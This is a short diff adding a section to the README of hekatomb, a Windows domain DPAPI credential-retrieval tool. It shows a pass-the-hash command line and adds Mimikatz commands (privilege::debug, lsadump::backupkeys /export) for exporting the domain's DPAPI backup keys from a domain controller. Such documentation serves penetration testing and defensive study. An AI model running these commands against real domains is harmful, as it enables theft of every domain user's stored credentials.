@@ -87,5 +87,16 @@ python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/admini
 ```
 
 <br>
+<br
+## How to retrieve domain backup keys ?
 <br>
+Just use Mimikatz on your domain controller to extract keys :
+<br><br />
+
+```python
+privilege::debug
+lsadump::backupkeys /export
+```
+
+<br /><br />
 If no domain backup keys are provided, the script will only retrieve DPAPI blobs without decrypting them.
